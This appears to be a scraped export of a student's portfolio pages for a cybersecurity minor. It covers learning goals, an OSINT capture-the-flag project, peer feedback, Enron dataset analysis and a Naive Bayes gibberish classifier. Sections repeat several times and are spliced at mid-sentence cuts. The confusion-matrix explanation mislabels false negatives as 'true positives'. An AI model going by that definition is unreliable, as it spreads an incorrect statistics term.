Altijd goede kwaliteit oplevering.\n- Works hard on creating new challenges and makes really creative and difficult ones.\n- Goede focus op je werkzaamheden\n- Works hard and shows others what you did. The work you do is always very good.\n\n#### Improvements \n\n- Communiceer gedurende de dag wat meer met het team\n- Mag gedurende de dag wat meer laten weten waar hij mee bezig is als hij niet aanwezig is.\n- Communiceer wat meer op een werkdag\n- Working very hard, maybe sometimes a bit too hard.\n\nAs you can see, the overall assessment is very positive. It is nice to hear that my groupmates think positively of me. This is very motivating to continue developing the project.\nNevertheless, there are also some things in which I can still improve myself. The most important point is communication. The first few weeks, this went very well but due to matters outside of school I was unable to come to school on location for the last two weeks. \n\n### Peerassement (2)\n\nBelow are the points that can be seen as given by my teammates within my project group.

It is nice to hear that my groupmates think positively of me. I also see a improvement in my communication skills on a professional level. \n\n### Conclusion \n\nOverall, I have developed myself well this semester the feedback I received was generally very positive. there was a point of development for communication I worked on this and it is reflected in the reviews of my team members. Because of the alternating corona measures and consequences of working from home, it was sometimes difficult to switch. I did have trouble with that, but generally speaking the whole group did. Despite all this, it went well and we were able to deliver a nice product. \n\n### Professional writing\n\nFor the professional writing I chose to write my portfolio in English. Currently I am taking an English course to bring my English to a professional level so writing my portfolio in English is a very good exercise. I have also done different researches like the static research. This has also contributed to my professionalism so I have learned how to set up a hypothesis, do research and analyze the data. In the process I also learned how to draw a conclusion from the results as found in the research. \n\n### Ethical aspect. \n\nI have delved quite deeply into the ethical processes within the topics I cover. I have also done this for the group project. This has taught me how to approach certain things and what things cannot be done within the field and specialization. \n\n### Network\n\nDuring this minor I was actively searching graduating position in Software Engineering. For this I look some time to setup my LinkedIn profile. I have been in contact with multiple companies and chose one that took my interest. In doing so i expanded my social network on LinkedIn. I also developed the site you're looking at this during this minor. Within this site you can read about all the topic I covered. \n\n### Intercultural competence\n\nDuring this semester I followed an English C1 Cambridge course in the evening hours. The focus is mainly on cultural aspects and which words fit best in a situation to speak fluently and native. I also chose to write documentation in English this entire semester, and the workshops that were in English also contributed to this. \n\n## General Conslusion \n\nOverall, I think I learned a lot in this minor. In doing so, I placed my focus mainly on performing machine learning in the area of cyber. I had no prior knowledge of this topic. Now I have a broad scale of knowledge both technical and non technical aspects working on the group project and on the portfolio helped to improve my technical and non-technical and professional and innovations skills. I was happy in the way this minor was structured. It was very open minded I was free in learning about things of interest what I personally find very motivating. It was also allowed to combined different aspects within the cyber atmosphere. I did a lot of side projects that interested me I learned a lot about all of them and besides you really benefit if you are free in what you want to learn because you only learn what you are interested in. Finally, I would like to conclude this minor by thanking all the teachers, especially Stefan and Peter, for their great guidance. \n\nI will evetually graduate in the field of software-engineering, but all the knowledge I have gained during this minor is very valuable.","dir":"/projects/minor","path":"/projects/minor/learning-objectives","extension":".md","createdAt":"2022-01-17T15:02:36.882Z","updatedAt":"2022-01-17T15:02:36.882Z","bodyPlainText":"\n# Learning Objectives\nThe learning objectives I want to cover this semester (some of which I want to develop for the current minor \"Cyber\") are as followed:\nMathematica\n\n<div class=\"table-one\">\n\n| subject     | elaborate   | explanation |\n| ----------- | ----------- | ----------- |\n| Calculus    |             | Mathematics |\n| Logic       | X           | Logical proof and reasoning |\n| Sets        |             | Set theory - study and formalization of sets |\n| Statistics  | X           | Statistics is the science and technique of collecting, processing, interpreting, and presenting data |\n| Algorithmics| X           | Algorithmics is obviously about algorithms.

We will focus on 3 aspects as described in the Cyber course. I will describe each learning objective briefly and give an evaluation. I will also talk about the group project and the tasks that we made within this group. I will also briefly show my peer assessment results as I have been assessed by my group members. In the conclusion, a reflection about all assignments is written; how it went and what could be better etc. \n\n## LO1 – Digital forensics \n\nMy specialization that I chose for this minor is Digital Forensics. This specialization is about collecting digital evidence that can show that an organization or person has performed things in a digital environment that are not acceptable. During this specialization route, I am going to look at ethical issues and the different possibilities within this specialization. I will also look at how tooling is used within an investigation. I will also shift my focus to the field of machine-learning and its applications within the cyber aspect. \n\nWhat a digital forensic does exactly can be read in my portfolio. Herein, I map out different topics and techniques. \n\n### Learning activies\n\n| Task                                             | Status | Pre-knowledge         |\n| ------------------------------------------------ | ------ | --------------------- |\n| Machine-learning Enron Dataset                   | Done   | None                  |\n| Machine-learning Gibbarish                       | Done   | None                  |\n| Machine-learning seclab                          | Done   | None                  |\n| Statistics formula’s                             | Done   | None                  |\n| Statistical research                             | Done   | None                  |\n| Captcha  mechanism                               | Done   | Some prior  knowledge |\n| Digital forensics methodology                    | Done   | None                  |\n| Course code cyber analysis (Secure code  review) | Done   | Prior  knowledge      |\n| Regular expressions “Regex” evil “Regex”         | Done   | Some prior  knowledge |\n| OSINT                                            | Busy   | None                  |\n| GDPR FDA 21 CFR Part 11                          | Busy   | Prior  knowledge      |\n| Pentest Methodology                              | Done   | Prior  knowledge      |\n| Own a linux system                               | Done   | None                  |\n| Algorithms                                       | Done   | Prior knowledge       |\n\n### Technical learning activities\n\nFor machine learning aspect I had to make a model that would detect so-called gibberish. This was part of a statistical research project where I was looking for a correlation between malicious URL's and gibberish. Since there was no open source model that would detect gibberish I had to make one myself. This was a challenge but I managed to make it work. After I got the model working I was able to write my research document for my statistical course. So these courses are connected to each other and have a cyber aspect to them. I also did some side project to further broaden my knowledge about other topics relating to cyber.  \n\n### Nontechnical learning activities\n\nThe non-technical learning activities are methodologies about different aspects within the Cyber security atmosphere. I also did some ethical research on topics of my interest. This gave me a broad view of what I can and can not do within my professional field.\n\n### Conclusion \n\nAs of now I have gained knowlegde in a number of technical learning objectives. I made this measurable by documenting the steps I took to get to my learning objectives. Before this, I did not have any prior knowledge in any of these topics so I have gained most of my knowledge during the execution of the assignments. It is fair to say that I have created a steady basis for myself to build up more knowledge regarding cyber related aspects.  \n\n## LO2\n\nThis chapter will address how I personally developed within the group project. In doing so, I will talk about the research and tasks I have made within the OSINT Project. I will also talk briefly about the communication within the group and the meetings with both the group members and stakeholders. \n\n### Project setting\n\nOSINT is an important part of the current state of the world. With OSINT, you can find a lot of information that is publicly known. Think about news websites, articles, social media and so on. Since Fontys wants to make their students more familiar with OSINT and the dangers and possibilities of it, we set up this project plan. The idea is to develop a CTF environment where students and government students can gain knowledge on how to use OSINT and what the possibilities and dangers are. At Fontys, government trainees and students come to learn what OSINT is all about. To keep this topic interesting, a fun and interactive way to demonstrate OSINT must be found. One way to accomplish this is a CTF related to OSINT. Capture the flags are a fun and interactive way to accomplish this.  \nThe goal is to develop a running, stable and reachable CTF system. Users should be able to play challenges independently and these challenges should have a storyline/goal. Challenges are exercises that a user will have to perform in order to learn more about OSINT. Challenges should be fun and encouraging in order to motivate users to learn more. We also need to describe ethics and scenarios. With scenarios you can think of the Bellingcat and MH17 example. In challenges, users learn what tooling is applied, when it is applied and what tooling is available.\n\n### Contribution\n\nI was the scrum leader during the definition phase of the project. This meant that I was the first to define the tasks within the group and then assign them. I also have a big role within the creation of challenges within our platform. In doing so, I made sure that there was a set format and a set theme. The theme has to do with aliens who try to infiltrate our society. It is up to the trainee to track down these aliens. I have also contributed to the research within our group by helping to formulate the research questions and applying the .dot framework. I also made sure there was good communication within the group so that everyone knows what they are doing and the other way around. During the final sprint we showed all our challenges within our platform. We did this as a group in the form of a workshop with other students. These students gave feedback about our final challenges. After that we transformed the two group project is to one whole platform with combined challenges from both groups. \n\n### Conclusion \n\nFinally, in terms of my growth as an innovator, I have had experience expressing my ideas in the early stages of project development and sharing them with my colleagues. In addition, I have interacted with clients through interviews, meetings, a presentation, and reports.\n\n## LO3\n\nThis chapter will focus on a peer review of my project skills and feedback from my coach, stakeholders, and other external sources. It will also review and analyze things as well as my contributions to professional writing and communication tasks which include presenting, interviewing, relationship management and advising. It will also cover the ethical aspects of my professional development as a security professional.\n\n### Peerassement (1)\n\nBelow are the points that can be seen as given by my teammates within my project group.

Altijd goede kwaliteit oplevering.\n- Works hard on creating new challenges and makes really creative and difficult ones.\n- Goede focus op je werkzaamheden\n- Works hard and shows others what you did. The work you do is always very good.\n\n#### Improvements \n\n- Communiceer gedurende de dag wat meer met het team\n- Mag gedurende de dag wat meer laten weten waar hij mee bezig is als hij niet aanwezig is.\n- Communiceer wat meer op een werkdag\n- Working very hard, maybe sometimes a bit too hard.\n\nAs you can see, the overall assessment is very positive. It is nice to hear that my groupmates think positively of me. This is very motivating to continue developing the project.\nNevertheless, there are also some things in which I can still improve myself. The most important point is communication. The first few weeks, this went very well but due to matters outside of school I was unable to come to school on location for the last two weeks. \n\n### Peerassement (2)\n\nBelow are the points that can be seen as given by my teammates within my project group.

It is nice to hear that my groupmates think positively of me. I also see a improvement in my communication skills on a professional level. \n\n### Conclusion \n\nOverall, I have developed myself well this semester the feedback I received was generally very positive. there was a point of development for communication I worked on this and it is reflected in the reviews of my team members. Because of the alternating corona measures and consequences of working from home, it was sometimes difficult to switch. I did have trouble with that, but generally speaking the whole group did. Despite all this, it went well and we were able to deliver a nice product. \n\n### Professional writing\n\nFor the professional writing I chose to write my portfolio in English. Currently I am taking an English course to bring my English to a professional level so writing my portfolio in English is a very good exercise. I have also done different researches like the static research. This has also contributed to my professionalism so I have learned how to set up a hypothesis, do research and analyze the data. In the process I also learned how to draw a conclusion from the results as found in the research. \n\n### Ethical aspect. \n\nI have delved quite deeply into the ethical processes within the topics I cover. I have also done this for the group project. This has taught me how to approach certain things and what things cannot be done within the field and specialization. \n\n### Network\n\nDuring this minor I was actively searching graduating position in Software Engineering. For this I look some time to setup my LinkedIn profile. I have been in contact with multiple companies and chose one that took my interest. In doing so i expanded my social network on LinkedIn.

prototype. \nAfter the prototype, I built a final version whose elaboration is described below. \nDescribing the elaboration was difficult because the prepairing of the data was quite complicated.\n\n# Assignments\n## Enron Dataset\nThe Enron Email Corpus is a massive dataset, containing approximately 500,000 messages from executives of the Enron Corporation. \nEnron was a large American company that was investigated by the Federal Energy Regulatory Commission (FERC) in 2001 after its rather spectacular bankruptcy and dissolution. \nIt contains records of about 150 users, mostly management of Enron, organized in folders. \nThe corpus contains a total of about 0.5M messages. \nThis data was originally made public, and put on the web, by the Federal Energy Regulatory Commission during its investigation. \nIn its raw form, the Enron corpus is a massive collection of folders containing 2.2 Gigabytes of messages in MBOX format, all individually preserved\n\n### Biggest corporate fraud\nBut first we need to know something about the biggest corporate fraud in American history!\nThe Enron fraud is a big, messy, and totally fascinating story of corporate malfeasance of almost every type imaginable. \nAlthough it started out as an energy company, it was involved in so many complex issues that people didn't understand exactly what the company was doing. \nEnron was fantastic! Very attractive to investors and the fastest growing company that was making money at a rate no one had ever seen. \nThey were the darlings of Wall Street, a company that could never lose. \nIt had good political connections, was making money at an incredible rate, and seemed to be the leading innovative company and highly profitable investment.\n\nIn the course I will be taking, \nwe are going to use Python to analyze the dataset, \nand discover patterns and clues through data exploration, \nas well as build a regression model that could predict the bonus of a person at Enron based on the salaries he receives.\n\nrecourse:\n- [The EnronSent Corpus](https://www.colorado.edu/ics/sites/default/files/attached-files/01-11_0.pdf)\n- [Deriving Patterns of Fraud from the Enron Dataset](https://towardsdatascience.com/deriving-patterns-of-fraud-from-the-enron-dataset-64cbceb65c36)\n\n### Analysis on enron mail datasets \nAnalysis on enron mail datasets:\n| Question | answer |\n| ----------- | ----------- |\n| How many data points (people) are in the data set? | 146 |\n| For each person, how many functions are available? | 21 |\n| How many POIs are there in the E+F dataset? | 18 |\n| How many POIs are there in total? | 35 |\n| What is the total value of James Prentice's shares?\t| 1095040 |\n| How many emails do we have from Wesley Colwell to persons of interest? | 240 |\n| What is the value of stock options exercised by Jeffrey K Skilling?\t| 19250000 |\n| Who made the most money? | YEAP SOON |\n| How many people in this dataset have a quantified salary? | 95 |\n| How many people in this dataset have an email address? | 111 |\n| How many people in the E+F dataset (as it currently exists) have \"NaN\" for their total payments? | 21 |\n| What percentage of people in the data set as a whole do? | 14.38% |\n| How many POIs in the E+F dataset have \"NaN\" for their total payments? | 0 |\n| What percentage of POIs as a whole is this? | 0% |\n\n### learning objectives\nThe assignment above here elaborate the following learning objectives from body of knowledge:\n- Study forensic methodologies and practices (see resources below). List these standards and how and where they are applied in your portfolio or in a blog or article.\n- Work out forensic challenges that you can find online or get from teachers.\n\n\n## Gibberish detection - naive bayes \nFor the project where I had to analyze and conclude a hypothesis, I created a Machine Learning algortime by applying Naive Bayes. \nHereby I prepared different dataset and merged them. \n\nThe datasets used for this purpose consist of:\n| Dataset | Description | Label |\n| ----------- | ----------- | ----------- |\n| Amazon Reviews | Top review left under a product by customers | Positive (1) |\n| Youtube Cyptic comments | Spam comments left by users under videos | Negative (0) |\n| Gibberish | A dataset with random characters | Negative (0) |\n\nI labeled this dataset with code and made it usable for analysis. \nTo apply Naive Bayes, I used scikit-learn. \nNaive Bayes is a method for calculating the probability of something happening. \nIn the project, I use this because I want to calculate the probability that text is positive or negative in nature. \nThe probability is calculated by analyzing the dataset and attaching weights to it. \nFor example, how often does a specific word occur in a text. \nLet's use the words \"dog,\" \"toy,\" \"brown,\" and \"sunny\" as examples. \nSuppose the analysis shows that the word dog occurs as many as 100 times and the other words also occur around that range. \nThen we add a dataset with the characteristics of gibberish language. \nWeights are also attached to this. \nNow when we continue to make a prediction of the word \"sun\" it will always be positive. \nBut if we are going to predict the word \"adskladhjl\" it will be negative. \n\nSo to get this done we need to start training the algorithm below is an example of this. \n```py\n# Count word usage \nvectorizer = CountVectorizer(stop_words='english')\nall_features = vectorizer.fit_transform(df_merged.Response)\n\n# Split list into random train and test subsets\nx_train, x_test, y_train, y_test, = train_test_split(all_features, df_merged.Label, test_size=0.35) \n\nclassifier = MultinomialNB()  # Create Model (naive bayes) multinomial\nclassifier.fit(x_train, y_train)  # Train Model\n```\n\n\nIn my code, I use the multinomial Naive Bayes classifier. \\\nThis is suitable for classification with discrete features (e.g., word counts for text classification)\n\n<a href=\"/images/projects/minor/machine_learning/minor_cyber_machine_learning_scores.png\" target=\"_blank\" rel=\"some text\">\n  <img width=\"80%\" src=\"/images/projects/minor/machine_learning/minor_cyber_machine_learning_scores.png\" alt=\"Machine learning main image\"/>\n</a>\n\nIt is very important for an algorithm that the accuracy is high. From the image above you can see that my algorithm can make a prediction for future data with a certainty of around 98%. \n\n# Workshop Tilburg\n\nDuring this workshop it was explained how machine learning could be applied to detect cyber attacks. Here we were given a presentation with the basic principles and techniques. We were then allowed to apply these within the supplied dataset. Because I already did two projects within this field it was not so difficult and it was easy because they used scikit learn. \n\n## Confusion Matrix\n\nWhen you are using machine learning algorithms it is useful to always test your dataset. This can be done with a confusion matrix when done you can see where your algorithm goes wrong and where it predicted wrong values. It gives you a general performance level of a classification model. \n\nBelow I am going to briefly explain how to read a confusion table: \n\n<img width=\"80%\" src=\"/images/projects/minor/machine_learning/confusion_matrix.png\" alt=\"Machine learning main image\"/>\n\nas you can see the total predictions that this model did was 165. Within those 165 predictions it gave a total of 100 times yes when it was actually yes and it predicted no 50 times when it was actually no. But we can also see the errors we can for example see that it  predicted no 5 times when it was textually yes and 10 times yes when it was actually no. \n\n- 50 times No when it was actually no = true negatives \n- 100 times yes when it was actually yes = true positives \n- 5 times no when it was actually yes = true positives = type two error \n- 10 times yes when it was actually no = false positives = type one error\n\n<img width=\"80%\" src=\"/images/projects/minor/machine_learning/confusion_matrix_sum.png\" alt=\"Machine learning main image\"/>\n\nThis is a list of rates that are often computed from a confusion matrix:\n\n- Accuracy: Overall, how often is the classifier corrrect? \n\n  - (TP+TN)/total = (100+50)/165 = 0,91\n\n- Misclassification Rate (Error rate): Overall, how often is it wrong?\n\n  - (FP+FN)/total = (10+5)/165 = 0.09\n\n- True Positive Rate: When it's actually yes, how often does it predict yes?\n\n  - TP/actual yes = 100/105 = 0.95\n\n    Also known as \"Sensitivity\" or \"Recall\"\n\n- False Positive Rate: When it's actually no, how often does it predict yes?\n\n  - FP/actual no = 10/60 = 0.17\n\n- True Negative Rate: When it's actually no, how often does it predict no?\n\n  - TN/actual no = 50/60 = 0.83\n\n    Equivalent to 1 minus False Positive Rate\n\n    Also known as \"Specificity\"\n\n- Precision: When it predicts yes, how often is it correct?\n\n  - TP/predicted yes = 100/110 = 0.91\n\n- Prevalence: How often does the yes condition actually occur in our sample?\n\n  - actual yes/total = 105/165 =0.64\n\nBelow is a confusion matrix I made at the workshop in tilburg: \n\n<img width=\"80%\" src=\"/images/projects/minor/machine_learning/machine_learning_confusion_matrix.png\" alt=\"Machine learning main image\"/>\n\nHere we can see that the table is bigger but the same principle remains. \n","dir":"/projects/minor","path":"/projects/minor/machine-learning","extension":".md","updatedAt":"2022-01-17T15:02:36.882Z","bodyPlainText":"\n# Machine Learning\n## Introduction\nI would like to learn how to apply \"Machine Learning\" to data and thereby perform a useful analysis on this data. \nI would like to learn this as a new challenge to learn more about the techniques behind Machine Learning. \nWhat is it, what is it used for or when to use it. \nI am going to link to Cyber by performing a data analysis on a dataset related to the subject of cyber. \nIn doing so, I am using the \"Eron\" dataset which is specifically used for forensics. \nIn order to apply all of this, I need to learn about the different types of algorithms out there. \nFor this I need Python and knowledge of the types of algorithms out there and when to apply them. \nBy executing and following course on Udacity and the associated assignments, \nI am going to make this learning goal measurable for myself. \nFurthermore, I also want to eventually be able to perform an analysis on the Enron dataset.\n\n## Evaluate\n### Version (1)\nCurrently I am working on Udacity: [\"Intro to Machine Learning\"](https://www.udacity.com/course/intro-to-machine-learning--ud120). \nThis course I have now 50% completed. \nDuring this course I learned about Naive Bayes, SVM, Decision Trees and Regression. \nThe material was easy to understand but at the moment I do not know how I can apply it within my own project/research. \nThe step from theory to practice\n\n### Version (2)\nHere I have been working on building an algorithm that detects gibberish. \nThis was quite difficult because I had no prior knowledge.\nI contacted lecturer Peter Lambooij and discussed how I could best approach this. \nHe suggested that I delve further into Naive Bayes. \nI had a small knowledge of Naive Bayes from the Udacity course but to build the algorithm I needed more knowledge so I decided to delve further into this subject. \nAfter finding out how the algorithm works and its applications I started to build a prototype. \nAfter the prototype, I built a final version whose elaboration is described below. \nDescribing the elaboration was difficult because the prepairing of the data was quite complicated.\n\n# Assignments\n## Enron Dataset\nThe Enron Email Corpus is a massive dataset, containing approximately 500,000 messages from executives of the Enron Corporation. \nEnron was a large American company that was investigated by the Federal Energy Regulatory Commission (FERC) in 2001 after its rather spectacular bankruptcy and dissolution. \nIt contains records of about 150 users, mostly management of Enron, organized in folders. \nThe corpus contains a total of about 0.5M messages. \nThis data was originally made public, and put on the web, by the Federal Energy Regulatory Commission during its investigation. \nIn its raw form, the Enron corpus is a massive collection of folders containing 2.2 Gigabytes of messages in MBOX format, all individually preserved\n\n### Biggest corporate fraud\nBut first we need to know something about the biggest corporate fraud in American history!\nThe Enron fraud is a big, messy, and totally fascinating story of corporate malfeasance of almost every type imaginable. \nAlthough it started out as an energy company, it was involved in so many complex issues that people didn't understand exactly what the company was doing. \nEnron was fantastic!

We will focus on 3 aspects as described in the Cyber course. I will describe each learning objective briefly and give an evaluation. I will also talk about the group project and the tasks that we made within this group. I will also briefly show my peer assessment results as I have been assessed by my group members. In the conclusion, a reflection about all assignments is written; how it went and what could be better etc. \n\n## LO1 – Digital forensics \n\nMy specialization that I chose for this minor is Digital Forensics. This specialization is about collecting digital evidence that can show that an organization or person has performed things in a digital environment that are not acceptable. During this specialization route, I am going to look at ethical issues and the different possibilities within this specialization. I will also look at how tooling is used within an investigation. I will also shift my focus to the field of machine-learning and its applications within the cyber aspect. \n\nWhat a digital forensic does exactly can be read in my portfolio. Herein, I map out different topics and techniques. \n\n### Learning activies\n\n| Task                                             | Status | Pre-knowledge         |\n| ------------------------------------------------ | ------ | --------------------- |\n| Machine-learning Enron Dataset                   | Done   | None                  |\n| Machine-learning Gibbarish                       | Done   | None                  |\n| Machine-learning seclab                          | Done   | None                  |\n| Statistics formula’s                             | Done   | None                  |\n| Statistical research                             | Done   | None                  |\n| Captcha  mechanism                               | Done   | Some prior  knowledge |\n| Digital forensics methodology                    | Done   | None                  |\n| Course code cyber analysis (Secure code  review) | Done   | Prior  knowledge      |\n| Regular expressions “Regex” evil “Regex”         | Done   | Some prior  knowledge |\n| OSINT                                            | Busy   | None                  |\n| GDPR FDA 21 CFR Part 11                          | Busy   | Prior  knowledge      |\n| Pentest Methodology                              | Done   | Prior  knowledge      |\n| Own a linux system                               | Done   | None                  |\n| Algorithms                                       | Done   | Prior knowledge       |\n\n### Technical learning activities\n\nFor machine learning aspect I had to make a model that would detect so-called gibberish. This was part of a statistical research project where I was looking for a correlation between malicious URL's and gibberish. Since there was no open source model that would detect gibberish I had to make one myself. This was a challenge but I managed to make it work. After I got the model working I was able to write my research document for my statistical course. So these courses are connected to each other and have a cyber aspect to them. I also did some side project to further broaden my knowledge about other topics relating to cyber.  \n\n### Nontechnical learning activities\n\nThe non-technical learning activities are methodologies about different aspects within the Cyber security atmosphere. I also did some ethical research on topics of my interest. This gave me a broad view of what I can and can not do within my professional field.\n\n### Conclusion \n\nAs of now I have gained knowlegde in a number of technical learning objectives. I made this measurable by documenting the steps I took to get to my learning objectives. Before this, I did not have any prior knowledge in any of these topics so I have gained most of my knowledge during the execution of the assignments. It is fair to say that I have created a steady basis for myself to build up more knowledge regarding cyber related aspects.  \n\n## LO2\n\nThis chapter will address how I personally developed within the group project. In doing so, I will talk about the research and tasks I have made within the OSINT Project. I will also talk briefly about the communication within the group and the meetings with both the group members and stakeholders. \n\n### Project setting\n\nOSINT is an important part of the current state of the world. With OSINT, you can find a lot of information that is publicly known. Think about news websites, articles, social media and so on. Since Fontys wants to make their students more familiar with OSINT and the dangers and possibilities of it, we set up this project plan. The idea is to develop a CTF environment where students and government students can gain knowledge on how to use OSINT and what the possibilities and dangers are. At Fontys, government trainees and students come to learn what OSINT is all about. To keep this topic interesting, a fun and interactive way to demonstrate OSINT must be found. One way to accomplish this is a CTF related to OSINT. Capture the flags are a fun and interactive way to accomplish this.  \nThe goal is to develop a running, stable and reachable CTF system. Users should be able to play challenges independently and these challenges should have a storyline/goal. Challenges are exercises that a user will have to perform in order to learn more about OSINT. Challenges should be fun and encouraging in order to motivate users to learn more. We also need to describe ethics and scenarios. With scenarios you can think of the Bellingcat and MH17 example. In challenges, users learn what tooling is applied, when it is applied and what tooling is available.\n\n### Contribution\n\nI was the scrum leader during the definition phase of the project. This meant that I was the first to define the tasks within the group and then assign them. I also have a big role within the creation of challenges within our platform. In doing so, I made sure that there was a set format and a set theme. The theme has to do with aliens who try to infiltrate our society. It is up to the trainee to track down these aliens. I have also contributed to the research within our group by helping to formulate the research questions and applying the .dot framework. I also made sure there was good communication within the group so that everyone knows what they are doing and the other way around. During the final sprint we showed all our challenges within our platform. We did this as a group in the form of a workshop with other students. These students gave feedback about our final challenges. After that we transformed the two group project is to one whole platform with combined challenges from both groups. \n\n### Conclusion \n\nFinally, in terms of my growth as an innovator, I have had experience expressing my ideas in the early stages of project development and sharing them with my colleagues. In addition, I have interacted with clients through interviews, meetings, a presentation, and reports.\n\n## LO3\n\nThis chapter will focus on a peer review of my project skills and feedback from my coach, stakeholders, and other external sources. It will also review and analyze things as well as my contributions to professional writing and communication tasks which include presenting, interviewing, relationship management and advising. It will also cover the ethical aspects of my professional development as a security professional.\n\n### Peerassement (1)\n\nBelow are the points that can be seen as given by my teammates within my project group.

Altijd goede kwaliteit oplevering.\n- Works hard on creating new challenges and makes really creative and difficult ones.\n- Goede focus op je werkzaamheden\n- Works hard and shows others what you did. The work you do is always very good.\n\n#### Improvements \n\n- Communiceer gedurende de dag wat meer met het team\n- Mag gedurende de dag wat meer laten weten waar hij mee bezig is als hij niet aanwezig is.\n- Communiceer wat meer op een werkdag\n- Working very hard, maybe sometimes a bit too hard.\n\nAs you can see, the overall assessment is very positive. It is nice to hear that my groupmates think positively of me. This is very motivating to continue developing the project.\nNevertheless, there are also some things in which I can still improve myself. The most important point is communication. The first few weeks, this went very well but due to matters outside of school I was unable to come to school on location for the last two weeks. \n\n### Peerassement (2)\n\nBelow are the points that can be seen as given by my teammates within my project group.

It is nice to hear that my groupmates think positively of me. I also see a improvement in my communication skills on a professional level. \n\n### Conclusion \n\nOverall, I have developed myself well this semester the feedback I received was generally very positive. there was a point of development for communication I worked on this and it is reflected in the reviews of my team members. Because of the alternating corona measures and consequences of working from home, it was sometimes difficult to switch. I did have trouble with that, but generally speaking the whole group did. Despite all this, it went well and we were able to deliver a nice product. \n\n### Professional writing\n\nFor the professional writing I chose to write my portfolio in English. Currently I am taking an English course to bring my English to a professional level so writing my portfolio in English is a very good exercise. I have also done different researches like the static research. This has also contributed to my professionalism so I have learned how to set up a hypothesis, do research and analyze the data. In the process I also learned how to draw a conclusion from the results as found in the research. \n\n### Ethical aspect. \n\nI have delved quite deeply into the ethical processes within the topics I cover. I have also done this for the group project. This has taught me how to approach certain things and what things cannot be done within the field and specialization. \n\n### Network\n\nDuring this minor I was actively searching graduating position in Software Engineering. For this I look some time to setup my LinkedIn profile. I have been in contact with multiple companies and chose one that took my interest. In doing so i expanded my social network on LinkedIn. I also developed the site you're looking at this during this minor. Within this site you can read about all the topic I covered. \n\n### Intercultural competence\n\nDuring this semester I followed an English C1 Cambridge course in the evening hours. The focus is mainly on cultural aspects and which words fit best in a situation to speak fluently and native. I also chose to write documentation in English this entire semester, and the workshops that were in English also contributed to this. \n\n## General Conslusion \n\nOverall, I think I learned a lot in this minor. In doing so, I placed my focus mainly on performing machine learning in the area of cyber. I had no prior knowledge of this topic. Now I have a broad scale of knowledge both technical and non technical aspects working on the group project and on the portfolio helped to improve my technical and non-technical and professional and innovations skills. I was happy in the way this minor was structured. It was very open minded I was free in learning about things of interest what I personally find very motivating. It was also allowed to combined different aspects within the cyber atmosphere. I did a lot of side projects that interested me I learned a lot about all of them and besides you really benefit if you are free in what you want to learn because you only learn what you are interested in. Finally, I would like to conclude this minor by thanking all the teachers, especially Stefan and Peter, for their great guidance. \n\nI will evetually graduate in the field of software-engineering, but all the knowledge I have gained during this minor is very valuable.","dir":"/projects/minor","path":"/projects/minor/malware-analysis","extension":".md","createdAt":"2022-01-17T15:02:36.882Z","updatedAt":"2022-01-17T15:02:36.882Z","bodyPlainText":"\n# Learning Objectives\nThe learning objectives I want to cover this semester (some of which I want to develop for the current minor \"Cyber\") are as followed:\nMathematica\n\n<div class=\"table-one\">\n\n| subject     | elaborate   | explanation |\n| ----------- | ----------- | ----------- |\n| Calculus    |             | Mathematics |\n| Logic       |            | Logical proof and reasoning |\n| Sets        |             | Set theory - study and formalization of sets |\n| Statistics  | X           | Statistics is the science and technique of collecting, processing, interpreting, and presenting data |\n| Algorithmics| X           | Algorithmics is obviously about algorithms.

I made this measurable by documenting the steps I took to get to my learning objectives. Before this, I did not have any prior knowledge in any of these topics so I have gained most of my knowledge during the execution of the assignments. It is fair to say that I have created a steady basis for myself to build up more knowledge regarding cyber related aspects.  \n\n## LO2\n\nThis chapter will address how I personally developed within the group project. In doing so, I will talk about the research and tasks I have made within the OSINT Project. I will also talk briefly about the communication within the group and the meetings with both the group members and stakeholders. \n\n### Project setting\n\nOSINT is an important part of the current state of the world. With OSINT, you can find a lot of information that is publicly known. Think about news websites, articles, social media and so on. Since Fontys wants to make their students more familiar with OSINT and the dangers and possibilities of it, we set up this project plan. The idea is to develop a CTF environment where students and government students can gain knowledge on how to use OSINT and what the possibilities and dangers are. At Fontys, government trainees and students come to learn what OSINT is all about. To keep this topic interesting, a fun and interactive way to demonstrate OSINT must be found. One way to accomplish this is a CTF related to OSINT. Capture the flags are a fun and interactive way to accomplish this.  \nThe goal is to develop a running, stable and reachable CTF system. Users should be able to play challenges independently and these challenges should have a storyline/goal. Challenges are exercises that a user will have to perform in order to learn more about OSINT. Challenges should be fun and encouraging in order to motivate users to learn more. We also need to describe ethics and scenarios. With scenarios you can think of the Bellingcat and MH17 example. In challenges, users learn what tooling is applied, when it is applied and what tooling is available.\n\n### Contribution\n\nI was the scrum leader during the definition phase of the project. This meant that I was the first to define the tasks within the group and then assign them. I also have a big role within the creation of challenges within our platform. In doing so, I made sure that there was a set format and a set theme. The theme has to do with aliens who try to infiltrate our society. It is up to the trainee to track down these aliens. I have also contributed to the research within our group by helping to formulate the research questions and applying the .dot framework. I also made sure there was good communication within the group so that everyone knows what they are doing and the other way around. During the final sprint we showed all our challenges within our platform. We did this as a group in the form of a workshop with other students. These students gave feedback about our final challenges. After that we transformed the two group project is to one whole platform with combined challenges from both groups. \n\n### Conclusion \n\nFinally, in terms of my growth as an innovator, I have had experience expressing my ideas in the early stages of project development and sharing them with my colleagues. In addition, I have interacted with clients through interviews, meetings, a presentation, and reports.\n\n## LO3\n\nThis chapter will focus on a peer review of my project skills and feedback from my coach, stakeholders, and other external sources. It will also review and analyze things as well as my contributions to professional writing and communication tasks which include presenting, interviewing, relationship management and advising. It will also cover the ethical aspects of my professional development as a security professional.\n\n### Peerassement (1)\n\nBelow are the points that can be seen as given by my teammates within my project group.

Altijd goede kwaliteit oplevering.\n- Works hard on creating new challenges and makes really creative and difficult ones.\n- Goede focus op je werkzaamheden\n- Works hard and shows others what you did. The work you do is always very good.\n\n#### Improvements \n\n- Communiceer gedurende de dag wat meer met het team\n- Mag gedurende de dag wat meer laten weten waar hij mee bezig is als hij niet aanwezig is.\n- Communiceer wat meer op een werkdag\n- Working very hard, maybe sometimes a bit too hard.\n\nAs you can see, the overall assessment is very positive. It is nice to hear that my groupmates think positively of me. This is very motivating to continue developing the project.\nNevertheless, there are also some things in which I can still improve myself. The most important point is communication. The first few weeks, this went very well but due to matters outside of school I was unable to come to school on location for the last two weeks. \n\n### Peerassement (2)\n\nBelow are the points that can be seen as given by my teammates within my project group.

